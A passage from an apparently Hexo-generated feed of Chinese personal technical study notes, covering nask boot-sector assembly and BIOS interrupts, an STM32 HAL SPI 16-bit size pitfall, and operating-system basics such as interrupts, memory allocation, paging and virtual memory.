    <content><![CDATA[<h1 id="一、汇编通用"><a href="#一、汇编通用" class="headerlink" title="一、汇编通用"></a>一、汇编通用</h1><h2 id="1-语法"><a href="#1-语法" class="headerlink" title="1. 语法"></a>1. 语法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 注释</span><br></pre></td></tr></table></figure>

<h1 id="二、nask汇编"><a href="#二、nask汇编" class="headerlink" title="二、nask汇编"></a>二、nask汇编</h1><p>汇编指令来源于《30天自制操作系统》一书中，编译环境为nask，似乎是作者自己写的编译，并不清楚和一般的汇编的区别</p>
<h2 id="1-指令介绍"><a href="#1-指令介绍" class="headerlink" title="1. 指令介绍"></a>1. 指令介绍</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DB      ; 添加1个字节长度数据</span><br><span class="line">DW      ; 添加2个字节长度数据</span><br><span class="line">DD      ; 添加4个字节长度数据</span><br><span class="line">RESB    ; 用0x00填充x字节</span><br><span class="line">$       ; 变量，可指当前位置的字节数</span><br><span class="line">ORG     ; 指定运行时机器语言指令装载内存地址，有这条指令后，$代表内存地址</span><br><span class="line">JMP     ; 相当于C语言goto</span><br><span class="line">MOV     ; 赋值，&quot;MOV AV, 0&quot;代表&quot;AV = 0&quot;，拷贝赋值而非移动，位数必须相同，不然编译出错</span><br><span class="line">[]      ; 代表内存地址</span><br><span class="line">CMP     ; 比较指令</span><br><span class="line">JE      ; &quot;Jump if equal&quot;，比较跳转指令，相等跳转，否则继续执行，和CMP配合使用</span><br><span class="line">JA      ; &quot;Jump if above&quot;，大于跳转，否则继续执行，和CMP配合使用</span><br><span class="line">JB      ; &quot;Jump if below&quot;，小于跳转，否则继续执行，和CMP配合使用</span><br><span class="line">JAE     ; &quot;Jump if above or equal&quot;，大于等于跳转，否则继续执行，和CMP配合使用</span><br><span class="line">JBE     ; &quot;Jump if below or equal&quot;，小于等于跳转，否则继续执行，和CMP配合使用</span><br><span class="line">JC      ; &quot;Jump if carry&quot;，捕获&quot;进位标志&quot;，如果为1则跳转</span><br><span class="line">JNC     ; &quot;Jump if not carry&quot;，捕获&quot;进位标志&quot;，如果为0则跳转</span><br><span class="line">EQU     ; 定义常数，相当于define</span><br><span class="line">HLT     ; CPU停止动作，外部事件唤醒，可能时键盘、鼠标等外部事件</span><br><span class="line">PUSH    ; 将寄存器内容入栈，PUSH EBP</span><br><span class="line">POP     ; 将栈顶内容设置到寄存器内，POP EBP</span><br><span class="line">CLI     ; 禁止CPU中断</span><br><span class="line">STI     ; 使能CPU中断</span><br><span class="line">IN      ; 从外设读取数据</span><br><span class="line">OUT     ; 将数据写入外设</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    DB      0xeb, 0x4e, 0x90</span><br><span class="line">    DB      2               ; FAT的个数（必须为2）</span><br><span class="line">    DB      &quot;HELLOIPL&quot;      ; 启动区的名称可以是任意的字符串</span><br><span class="line">    DW      512             ;</span><br><span class="line">    DD      2880            ; 重写一次磁盘大小</span><br><span class="line">    DD      0xffffffff      ; （可能是）卷标号码</span><br><span class="line">    RESB    18              ; 先空出18字节</span><br><span class="line">    RESB    0x1fe-$         ; 填写0x00，直到0x001fe</span><br><span class="line"></span><br><span class="line">    ORG     0x7c00          ; 指明程序的装载地址</span><br><span class="line">    JMP     entry</span><br><span class="line"></span><br><span class="line">entry:</span><br><span class="line">    MOV     AV, 0           ; 初始化寄存器</span><br><span class="line">    MOV     SS, AX</span><br><span class="line">    MOV     AL, [SI]        ; AL赋值为SI值的地址的值，SI储存为678，则AL赋值为内存中678号地址指向的值</span><br><span class="line">    MOV     BYTE [678], 123 ; 将123按照Byte（8位）储存在内存的678地址中</span><br><span class="line"></span><br><span class="line">; MOV使用寄存器赋值只有BX、BP、SI、DI，其他寄存器赋值可以使用下面指令进行</span><br><span class="line">    MOV     BX, DX</span><br><span class="line">    MOV     AL, BYTE [BX]</span><br><span class="line"></span><br><span class="line">    CMP     AL, 0</span><br><span class="line">    JE      entry</span><br><span class="line"></span><br><span class="line">    CMP     AL, 0</span><br><span class="line">    JA      entry</span><br><span class="line"></span><br><span class="line">    CMP     AL, 0</span><br><span class="line">    JB      entry</span><br><span class="line"></span><br><span class="line">    CMP     AL, 0</span><br><span class="line">    JAE     entry</span><br><span class="line"></span><br><span class="line">    CMP     AL, 0</span><br><span class="line">    JBE     entry</span><br><span class="line"></span><br><span class="line">    JC      error           ; FLAGS.CF进位标志为1则跳转</span><br><span class="line">    JNC     fin             ; FLAGS.CF进位标志为0则跳转</span><br><span class="line"></span><br><span class="line">CYLS    EQU     10          ; 定义CYLS为10</span><br></pre></td></tr></table></figure>

<h3 id="1-1-MOV-指令详解"><a href="#1-1-MOV-指令详解" class="headerlink" title="1.1. MOV 指令详解"></a>1.1. MOV 指令详解</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV         AL, 0           ; AL寄存器值设置成0</span><br><span class="line">MOV         EDX, [ESP+4]    ; 将ESP内部存的地址偏移4，作为地址找到值赋值给EDX</span><br><span class="line">MOV		    [ECX], AL       ; 将AL内部的值，赋值给ECX值作为地址的地方</span><br></pre></td></tr></table></figure>

<h2 id="2-实现C语言中的-void-write-mem8-char-addr-char-data"><a href="#2-实现C语言中的-void-write-mem8-char-addr-char-data" class="headerlink" title="2. 实现C语言中的 void write_mem8(char *addr, char data)"></a>2. 实现C语言中的 void write_mem8(char *addr, char data)</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">write_mem8</span><span class="params">(<span class="type">char</span> *addr, <span class="type">char</span> data)</span> </span>&#123;</span><br><span class="line">    *addr = data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>手写</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_write_mem8:	; void write_mem8(char *addr, char data);</span><br><span class="line">    MOV		ECX, [ESP+4]		; [ESP+4]中存放的是addr，读到ECX中</span><br><span class="line">    MOV		AL, [ESP+8]		    ; [ESP+8]存放的是data，读到AL中</span><br><span class="line">    MOV		[ECX], AL</span><br><span class="line">    RET</span><br></pre></td></tr></table></figure>

<ul>
<li>nask编译出来的</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	GLOBAL	_write_mem8</span><br><span class="line">_write_mem8:</span><br><span class="line">	PUSH	EBP</span><br><span class="line">	MOV	    EBP, ESP</span><br><span class="line">	MOV	    EAX, DWORD [8+EBP]</span><br><span class="line">	MOV	    EDX, DWORD [12+EBP]</span><br><span class="line">	MOV	    BYTE [EAX],DL</span><br><span class="line">	POP	    EBP</span><br><span class="line">	RET</span><br></pre></td></tr></table></figure>

<p><strong>差异解释</strong></p>
<ul>
<li>ESP、EBP见<a href="#3-%E5%AF%84%E5%AD%98%E5%99%A8%E8%A7%A3%E9%87%8A">寄存器解释</a></li>
<li><code>PUSH EBP</code>将EBP入栈，保存系统栈状态，但是由于PUSH，导致ESP向上移动了4位</li>
<li>对第一种汇编，ESP指向栈顶，<code>ESP+4</code>是第一个参数位置</li>
<li>对第二种汇编，EBP等于了ESP，但是ESP向上移动了4位，所以<code>EBP+8</code>是第一个参数的位置</li>
</ul>
<h2 id="3-寄存器解释"><a href="#3-寄存器解释" class="headerlink" title="3. 寄存器解释"></a>3. 寄存器解释</h2><ul>
<li>ESP: 栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</li>
<li>EBP: 基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</li>
<li>EAX: 32位的寄存器，累加器(accumulator), 它是很多加法乘法指令的缺省寄存器。</li>
<li>EBX: 32位的寄存器，基地址(base)寄存器, 在内存寻址时存放基地址。</li>
<li>ECX: 32位的寄存器，计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。</li>
<li>EDX: 32位的寄存器，总是被用来放整数除法产生的余数。</li>
<li>AX: 16位寄存器，同样也是EAX的低16位，同样有BX, CX, DX</li>
<li>AH: 8位寄存器，同样是AX的高8位，同样有BH, CH, DH</li>
<li>AL: 8位寄存器，同样是AX的低8位，同样有BL, CL, DL</li>
</ul>
<h1 id="三、bios内置汇编指令"><a href="#三、bios内置汇编指令" class="headerlink" title="三、bios内置汇编指令"></a>三、bios内置汇编指令</h1><h2 id="1-调用显卡（INT-0x10"><a href="#1-调用显卡（INT-0x10" class="headerlink" title="1. 调用显卡（INT 0x10)"></a>1. 调用显卡（INT 0x10)</h2><h3 id="1-1-显示字符"><a href="#1-1-显示字符" class="headerlink" title="1.1. 显示字符"></a>1.1. 显示字符</h3><ul>
<li>INT为软件中断指令，用于调用BIOS内置函数</li>
<li>BIOS（Basic input output system）为厂家开发的提供给操作系统开发人员使用的程序，其中含有许多基本程序，使用INT调用</li>
<li>0x10函数使用INT调用为显示一个字符函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 显示一个字符，无返回值</span><br><span class="line">    MOV     AH, 0x0e</span><br><span class="line">    MOV     AL, &#x27;a&#x27;         ; 显示字符&#x27;a&#x27;</span><br><span class="line">    MOV     BH, 0</span><br><span class="line">    MOV     BX, 15          ; 指定字符颜色</span><br><span class="line">    INT     0x10            ; 调用显卡BIOS</span><br></pre></td></tr></table></figure>

<h3 id="1-2-设置显卡显示模式"><a href="#1-2-设置显卡显示模式" class="headerlink" title="1.2. 设置显卡显示模式"></a>1.2. 设置显卡显示模式</h3><ul>
<li>AH&#x3D;0x00</li>
<li>AL&#x3D;模式<ul>
<li>0x03: 16色字符模式，80x25</li>
<li>0x12: VGA图形模式，640x480x4位彩色模式，独特的4面储存模式</li>
<li>0x13: VGA图形模式，320x200x8位彩色模式，调色板模式</li>
<li>0x6a: 扩展VGA图形模式，800x600x4位彩色模式，独特的4面储存模式（部分显卡不支持）</li>
</ul>
</li>
<li>返回值: 无</li>
</ul>
<h2 id="2-磁盘读写，扇区校验，寻道函数（INT-0x13"><a href="#2-磁盘读写，扇区校验，寻道函数（INT-0x13" class="headerlink" title="2. 磁盘读写，扇区校验，寻道函数（INT 0x13)"></a>2. 磁盘读写，扇区校验，寻道函数（INT 0x13)</h2><ul>
<li>AH &#x3D; 0x02（读盘） &#x2F; 0x04（写盘） &#x2F; 0x0c（寻道）</li>
<li>AL &#x3D; 处理几个扇区（只能处理连续的扇区）</li>
<li>CH &#x3D; 柱面号（0-1位）</li>
<li>CL &#x3D; 扇区号（0-5位）|（柱面号&amp;0x300）&gt;&gt; 2</li>
<li>DH &#x3D; 磁头号</li>
<li>DL &#x3D; 驱动器号</li>
<li>ES:BX &#x3D; 缓冲地址（校验和寻道不使用）</li>
<li>返回值<ul>
<li>FLAGS.CF &#x3D;&#x3D; 0，没有错误，AH &#x3D;&#x3D; 0</li>
<li>FLAGS.CF &#x3D;&#x3D; 1，有错误，错误号码存于AH（与重置<code>reset</code>功能一样）</li>
</ul>
</li>
</ul>
<h3 id="2-1-复位磁盘"><a href="#2-1-复位磁盘" class="headerlink" title="2.1. 复位磁盘"></a>2.1. 复位磁盘</h3><ul>
<li>AH &#x3D; 0x00</li>
<li>DL &#x3D; 0x00</li>
<li>INT 0x13</li>
</ul>
<h1 id="四、gcc汇编"><a href="#四、gcc汇编" class="headerlink" title="四、gcc汇编"></a>四、gcc汇编</h1><h2 id="1-生成汇编代码"><a href="#1-生成汇编代码" class="headerlink" title="1. 生成汇编代码"></a>1. 生成汇编代码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-S 生成.s结尾的汇编代码文件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-fverbose-asm 将变量名称作为注释</span></span><br><span class="line">gcc -S -fverbose-asm xxx.c</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>stm32cubemx踩坑记</title>
    <url>/blogs/2019-04-16-stm32cubemxDebug/</url>
    <content><![CDATA[<h1 id="spi"><a href="#spi" class="headerlink" title="spi"></a>spi</h1><h2 id="spi的16位数据接收模式下size的问题"><a href="#spi的16位数据接收模式下size的问题" class="headerlink" title="spi的16位数据接收模式下size的问题"></a>spi的16位数据接收模式下size的问题</h2><p>spi发送有8位和16位发送&#x2F;接收模式，但是HAL库中的接口只有一种。比如最基础的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HAL_StatusTypeDef <span class="title">HAL_SPI_Transmit</span><span class="params">(SPI_HandleTypeDef *hspi, <span class="type">uint8_t</span> *pData, <span class="type">uint16_t</span> Size, <span class="type">uint32_t</span> Timeout)</span></span>;</span><br><span class="line"><span class="function">HAL_StatusTypeDef <span class="title">HAL_SPI_Receive</span><span class="params">(SPI_HandleTypeDef *hspi, <span class="type">uint8_t</span> *pData, <span class="type">uint16_t</span> Size, <span class="type">uint32_t</span> Timeout)</span></span>;</span><br></pre></td></tr></table></figure>

<p>在8位模式下指针和size没有问题，但是16位模式下指针还是uint_8 *。根据源码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HAL_StatusTypeDef <span class="title">HAL_SPI_Transmit</span><span class="params">(SPI_HandleTypeDef *hspi, <span class="type">uint8_t</span> *pData, <span class="type">uint16_t</span> Size, <span class="type">uint32_t</span> Timeout)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set the transaction information */</span></span><br><span class="line">    hspi-&gt;State = HAL_SPI_STATE_BUSY_TX;</span><br><span class="line">    hspi-&gt;ErrorCode = HAL_SPI_ERROR_NONE;</span><br><span class="line">    hspi-&gt;pTxBuffPtr = (<span class="type">uint8_t</span> *)pData;</span><br><span class="line">    hspi-&gt;TxXferSize = Size;</span><br><span class="line">    hspi-&gt;TxXferCount = Size;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Transmit data in 16 Bit mode */</span></span><br><span class="line">    <span class="keyword">if</span> (hspi-&gt;Init.DataSize == SPI_DATASIZE_16BIT)</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">/* Transmit data in 16 Bit mode */</span></span><br><span class="line">        <span class="keyword">while</span> (hspi-&gt;TxXferCount &gt; <span class="number">0U</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Wait until TXE flag is set to send data */</span></span><br><span class="line">            <span class="keyword">if</span> (__HAL_SPI_GET_FLAG(hspi, SPI_FLAG_TXE))</span><br><span class="line">            &#123;</span><br><span class="line">                hspi-&gt;Instance-&gt;DR = *((<span class="type">uint16_t</span> *)hspi-&gt;pTxBuffPtr);</span><br><span class="line">                hspi-&gt;pTxBuffPtr += <span class="built_in">sizeof</span>(<span class="type">uint16_t</span>);</span><br><span class="line">                hspi-&gt;TxXferCount--;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Transmit data in 8 Bit mode */</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">while</span> (hspi-&gt;TxXferCount &gt; <span class="number">0U</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Wait until TXE flag is set to send data */</span></span><br><span class="line">            <span class="keyword">if</span> (__HAL_SPI_GET_FLAG(hspi, SPI_FLAG_TXE))</span><br><span class="line">            &#123;</span><br><span class="line">                *((__IO <span class="type">uint8_t</span> *)&amp;hspi-&gt;Instance-&gt;DR) = (*hspi-&gt;pTxBuffPtr);</span><br><span class="line">                hspi-&gt;pTxBuffPtr += <span class="built_in">sizeof</span>(<span class="type">uint8_t</span>);</span><br><span class="line">                hspi-&gt;TxXferCount--;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>可以看出16位模式下调用这个函数，指针用的是同一个。所以需要强行转换为<code>uint_8 *</code></li>
<li>size的递减没有考虑字节的问题，所以输入的size是发送的16位数据的个数，并不是整个数组的大小。</li>
</ul>
]]></content>
      <categories>
        <category>Debug</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统关键知识记录</title>
    <url>/blogs/2019-04-01-OS/</url>
    <content><![CDATA[<h1 id="一、操作系统基础"><a href="#一、操作系统基础" class="headerlink" title="一、操作系统基础"></a>一、操作系统基础</h1><h2 id="1-启动过程"><a href="#1-启动过程" class="headerlink" title="1. 启动过程"></a>1. 启动过程</h2><ul>
<li>BIOS在主板的一个rom空间里面，cpu启动会优先调用bios</li>
<li>bios是不可改的，一般出厂就写好的</li>
<li>bios从硬盘读取bootloader来交换控制权</li>
<li>bootloader为硬盘的第一扇区（引导扇区），512字节<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BIOS-&gt;bootloader-&gt;OS</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-中断、异常和系统调用"><a href="#2-中断、异常和系统调用" class="headerlink" title="2. 中断、异常和系统调用"></a>2. 中断、异常和系统调用</h2><h3 id="2-1-内核"><a href="#2-1-内核" class="headerlink" title="2.1. 内核"></a>2.1. 内核</h3><ul>
<li>内核是完全被信任的</li>
<li>内核防止上层程序破坏操作系统</li>
<li>内核操作硬件</li>
<li>只有内核可以执行特权指令</li>
<li>内核给上层提供接口</li>
</ul>
<h3 id="2-2-中断"><a href="#2-2-中断" class="headerlink" title="2.2. 中断"></a>2.2. 中断</h3><ul>
<li>来自于硬件设备的中断</li>
<li>中断是异步的，不确定产生时间</li>
<li>对应用程序透明</li>
<li>每个内部外部事件都会设置一个中断标记给cpu识别，每个中断事件都有一个id</li>
<li>中断出现后，需要保留当前软件状态，处理中断服务，恢复软件状态继续执行</li>
</ul>
<h3 id="2-3-异常"><a href="#2-3-异常" class="headerlink" title="2.3. 异常"></a>2.3. 异常</h3><ul>
<li>来自于应用程序的非法指令或者坏的处理状态</li>
<li>异常是同步的，程序运行时的异常</li>
<li>需要对应用程序进行处理，杀死或者重新执行</li>
<li>异常也是有异常编号，需要保留现场，对异常处理（杀死或者重新执行），恢复现场</li>
<li>这里的异常是操作系统中执行系统调用时产生的异常</li>
</ul>
<h3 id="2-4-系统调用"><a href="#2-4-系统调用" class="headerlink" title="2.4. 系统调用"></a>2.4. 系统调用</h3><ul>
<li>来源于应用程序向操作系统发起的服务请求</li>
<li>系统调用是异步或同步，返回结果可以异步返回</li>
<li>等待服务处理完后持续执行下一个处理</li>
<li>系统调用其实就是操作系统给应用程序提供的一套api接口</li>
</ul>
<p><strong>api接口列举</strong></p>
<ul>
<li>win32 api: windows专用</li>
<li>posix api: 用于<code>POSIX-based system</code><ul>
<li>包括unix、linux、mac os x所有版本</li>
</ul>
</li>
<li>java api: java虚拟机使用（jvm）</li>
</ul>
<p><strong>用户态和内核态</strong></p>
<ul>
<li>用户态特权级别很低</li>
<li>内核态可以完全控制整个计算机系统</li>
<li>系统调用就是将用户态应用程序转成内核态</li>
<li>函数调用是进程内的栈空间处理，系统调用需要从用户态的堆栈到内核态的堆栈</li>
<li>用户态转用户态之间的开销，为了安全</li>
</ul>
<p><strong>跨越系统边界开销</strong></p>
<ul>
<li>建立中断&#x2F;异常&#x2F;系统调用号与对应服务的映射关系（初始化）</li>
<li>建立内核堆栈</li>
<li>验证系统调用参数，防止异常调用</li>
<li>用户态到内核态之间的映射关系</li>
<li>内核态独立地址空间</li>
</ul>
<h2 id="3-连续内存分配"><a href="#3-连续内存分配" class="headerlink" title="3. 连续内存分配"></a>3. 连续内存分配</h2><h3 id="3-1-内存分层体系"><a href="#3-1-内存分层体系" class="headerlink" title="3.1. 内存分层体系"></a>3.1. 内存分层体系</h3><ul>
<li>内存分层为金字塔型</li>
<li>CPU中寄存器内有L1缓存最快</li>
<li>CPU外层有一个L2缓存稍快</li>
<li>主存就是内存条中的内存</li>
<li>硬盘上的交换分区就是虚拟内存，最慢</li>
</ul>
<p><strong>为什么要有逻辑地址空间</strong></p>
<ol>
<li>进程间不用关心内存映射，管理自己的空间</li>
<li>进程间地址空间独立，保护进程内内存空间</li>
<li>虚拟化，可以使用更多的内存，不用担心是来自硬盘还是内存条</li>
<li>可以进程间访问共享内存</li>
</ol>
<h3 id="3-2-地址空间-地址生成"><a href="#3-2-地址空间-地址生成" class="headerlink" title="3.2. 地址空间 &amp; 地址生成"></a>3.2. 地址空间 &amp; 地址生成</h3><ul>
<li>所有逻辑地址空间都会映射到物理地址空间的地址上</li>
<li>逻辑地址和物理地址之间的映射表是操作系统管理的</li>
<li>操作系统会建立维护一个映射和界限表，防止进程内存访问异常</li>
</ul>
<p><strong>指令运行过程</strong></p>
<ol>
<li>cpu加载指令到ALU（计算逻辑单元）</li>
<li>根据指令需要的内存逻辑地址，找mmu模块找地址</li>
<li>mmu模块根据mmu表查找逻辑地址对应的物理地址空间</li>
<li>查找物理地址空间加载数据给ALU处理</li>
</ol>
<p><strong>内存安全检查</strong></p>
<ol>
<li>cpu执行时如果发现访问的逻辑地址超出界限，会抛出一个内存访问异常</li>
<li>操作系统需要根据这个异常进行处理</li>
</ol>
<h3 id="3-3-内存碎片和内存动态分配"><a href="#3-3-内存碎片和内存动态分配" class="headerlink" title="3.3. 内存碎片和内存动态分配"></a>3.3. 内存碎片和内存动态分配</h3><ul>
<li>内存碎片分为外碎片和内碎片</li>
</ul>
<p><strong>内存分配算法</strong></p>
<ol>
<li>第一匹配分配: 找到内存区域中第一个符合要求的内存块分配<ul>
<li>优点: 简单、快速、可以产生更多更大的内存空间</li>
<li>缺点: 容易出现很多的内存碎片块</li>
</ul>
</li>
<li>最优分配: 找到内存区域中最合适分配的内存块<ul>
<li>优点: 避免拆分大的空闲块，最小化外碎片的尺寸，比较适合小的内存分配</li>
<li>缺点: 会出现跟多小的外碎片块无法使用，需要对空闲块排序，需要考虑合并</li>
</ul>
</li>
<li>最差分配: 找到内存中最大的内存块进行分配<ul>
<li>优点: 可以拆分大的空闲块，避免产生更小的内存碎片</li>
<li>缺点: 需要考虑合并和排序，可能导致更大的内存申请无法分配</li>
</ul>
</li>
</ol>
<h3 id="3-4-压缩式和交换式碎片整理"><a href="#3-4-压缩式和交换式碎片整理" class="headerlink" title="3.4. 压缩式和交换式碎片整理"></a>3.4. 压缩式和交换式碎片整理</h3><p><strong>压缩式碎片整理</strong></p>
<ol>
<li>重置程序合并孔洞</li>
<li>需要所有程序是动态可重置的</li>
<li>需要在程序没有调用cpu时处理</li>
<li>需要频繁拷贝，会导致开销很大</li>
</ol>
<p><strong>交换式碎片整理</strong></p>
<ol>
<li>程序需要更多地内存，没有那么多内存</li>
<li>抢占程序，将被抢占程序的占用内存放到硬盘上</li>
</ol>
<h2 id="4-非连续内存分配"><a href="#4-非连续内存分配" class="headerlink" title="4. 非连续内存分配"></a>4. 非连续内存分配</h2><h3 id="4-1-分段"><a href="#4-1-分段" class="headerlink" title="4.1. 分段"></a>4.1. 分段</h3><p><strong>连续内存分配缺点</strong></p>
<ol>
<li>分配的物理内存连续</li>
<li>内存利用率底</li>
<li>有外碎片和内碎片的问题</li>
</ol>
<p><strong>非连续内存分配的优点</strong></p>
<ol>
<li>程序的物理地址空间不连续</li>
<li>内存利用管理更好</li>
<li>允许共享代码和数据</li>
<li>动态加载和动态链接</li>
</ol>
<p><strong>非连续内存分配的缺点</strong></p>
<ul>
<li>需要考虑虚拟地址和物理地址的转换<ul>
<li>硬件实现（快）: 分段、分页</li>
<li>软件实现（开销大）</li>
</ul>
</li>
</ul>
<p><strong>分段</strong></p>
<ol>
<li>分段地址分为<code>段号+偏移</code></li>
<li>段表里面记录<code>段号=&gt;物理地址+段长</code></li>
<li>段是有长度限制的，cpu会判断长度限制，超出抛内存异常</li>
<li>段表是操作系统设置和维护的</li>
</ol>
<h3 id="4-2-分页"><a href="#4-2-分页" class="headerlink" title="4.2. 分页"></a>4.2. 分页</h3><ol>
<li>将物理内存划分为固定大小的帧</li>
<li>将逻辑地址空间分为固定大小的页</li>
<li>转换逻辑地址到物理地址（页到帧）<ul>
<li>页表</li>
<li>MMU&#x2F;TLB</li>
</ul>
</li>
<li>物理地址分为<code>帧号+偏移</code></li>
<li>虚拟地址分为<code>页号+偏移</code></li>
<li>页大小和帧大小一致</li>
<li>页表存的是<code>页号=&gt;帧号</code>，页表还有一个基地址</li>
<li>页表也是操作系统设置维护的</li>
</ol>
<p><strong>页寻址机制</strong></p>
<ol>
<li>页映射到帧</li>
<li>页是连续的虚拟内存</li>
<li>帧是非连续的物理内存</li>
<li>不是所有的页都有对应的帧</li>
</ol>
<h2 id="5-系统状态-睡眠-休眠-关机"><a href="#5-系统状态-睡眠-休眠-关机" class="headerlink" title="5. 系统状态 睡眠&#x2F;休眠&#x2F;关机"></a>5. 系统状态 睡眠&#x2F;休眠&#x2F;关机</h2><ul>
<li>睡眠: 内存保持上电，电脑不运行，仅内存耗电。开机可快速恢复</li>
<li>休眠: 内存写入磁盘，电脑不运行，可以断电。开机恢复较慢，需要从硬盘写回内存</li>
<li>关机: 内存丢失，电脑不运行。开机一切重新开始</li>
</ul>
<h1 id="二、变量内存分配方式"><a href="#二、变量内存分配方式" class="headerlink" title="二、变量内存分配方式"></a>二、变量内存分配方式</h1><p>内存分配有三种：静态存储区、堆区、栈区。</p>
<ol>
<li>静态存储区：内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。它主要存放静态数据、全局数据和常量。</li>
<li>栈区：在执行函数时，函数（包括main函数）内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。（任何变量都处于站区，例如int a[] &#x3D; {1, 2},变量a处于栈区。数组的内容也存在于栈区。）</li>
<li>堆区：亦称动态内存分配。程序在运行的时候用malloc或new申请任意大小的内存，程序员自己负责在适当的时候用free或delete释放内存。动态内存的生存期可以由我们决定，如果我们不释放内存，程序将在最后才释放掉动态内存。 但是，良好的编程习惯是：如果某动态内存不再使用，需要将其释放掉，并立即将指针置位NULL，防止产生野指针。</li>
</ol>
<h1 id="三、链接库"><a href="#三、链接库" class="headerlink" title="三、链接库"></a>三、链接库</h1><h2 id="1-静态库"><a href="#1-静态库" class="headerlink" title="1. 静态库"></a>1. 静态库</h2><ul>
<li>编译时将会编译进可执行文件，运行时不依赖</li>
<li>占用内存高，运行时会全部加载</li>
</ul>
<h2 id="2-动态库"><a href="#2-动态库" class="headerlink" title="2. 动态库"></a>2. 动态库</h2><ul>
<li>编译时链接，用时依赖</li>
<li>多个进程同时需要链接，只会加载一份</li>
</ul>
<h1 id="四、虚拟内存"><a href="#四、虚拟内存" class="headerlink" title="四、虚拟内存"></a>四、虚拟内存</h1><p>虚拟内存本身出现是因为内存不够用，需要使用磁盘空间代替内存进行使用，所以出现了虚拟内存。同时使用了虚拟内存在进程间可以实现隔离，算是附带好处，不过被使用的很普遍。</p>
<h2 id="1-技术介绍"><a href="#1-技术介绍" class="headerlink" title="1. 技术介绍"></a>1. 技术介绍</h2><p>虚拟内存别称虚拟存储器（Virtual Memory）。电脑中所运行的程序均需经由内存执行，若执行的程序占用内存很大或很多，则会导致内存消耗殆尽。为解决该问题，Windows中运用了虚拟内存 [2]  技术，即匀出一部分硬盘空间来充当内存使用。当内存耗尽时，电脑就会自动调用硬盘来充当内存，以缓解内存的紧张。若计算机运行程序或操作所需的随机存储器(RAM)不足时，则 Windows 会用虚拟存储器进行补偿。它将计算机的RAM和硬盘上的临时空间组合。当RAM运行速率缓慢时，它便将数据从RAM移动到称为“分页文件”的空间中。将数据移入分页文件可释放RAM，以便完成工作。 一般而言，计算机的RAM容量越大，程序运行得越快。若计算机的速率由于RAM可用空间匮乏而减缓，则可尝试通过增加虚拟内存来进行补偿。但是，计算机从RAM读取数据的速率要比从硬盘读取数据的速率快，因而扩增RAM容量（可加内存条）是最佳选择。</p>
<p>虚拟内存是Windows 为作为内存使用的一部分硬盘空间。虚拟内存在硬盘上其实就是为一个硕大无比的文件，文件名是PageFile.Sys，通常状态下是看不到的。必须关闭资源管理器对系统文件的保护功能才能看到这个文件。虚拟内存有时候也被称为是“页面文件”就是从这个文件的文件名中来的。</p>
<p>内存在计算机中的作用很大，电脑中所有运行的程序都需要经过内存来执行，如果执行的程序很大或很多，就会导致内存消耗殆尽。为了解决这个问题，WINDOWS运用了虚拟内存技术，即拿出一部分硬盘空间来充当内存使用，这部分空间即称为虚拟内存，虚拟内存在硬盘上的存在形式就是 PAGEFILE.SYS这个页面文件。</p>
<h2 id="2-调度介绍"><a href="#2-调度介绍" class="headerlink" title="2. 调度介绍"></a>2. 调度介绍</h2><h3 id="2-1-页式调度"><a href="#2-1-页式调度" class="headerlink" title="2.1. 页式调度"></a>2.1. 页式调度</h3><p>1、页式虚存地址映射页式虚拟存储系统中，虚地址空间被分成等长大小的页，称为逻辑页；主存空间也被分成同样大小的页，称为物理页。相应地，虚地址分为两个字段：高字段为逻辑页号，低字段为页内地址（偏移量）；实存地址也分两个字段：高字段为物理页号，低字段为页内地址。通过页表可以把虚地址（逻辑地址）转换成物理地址。</p>
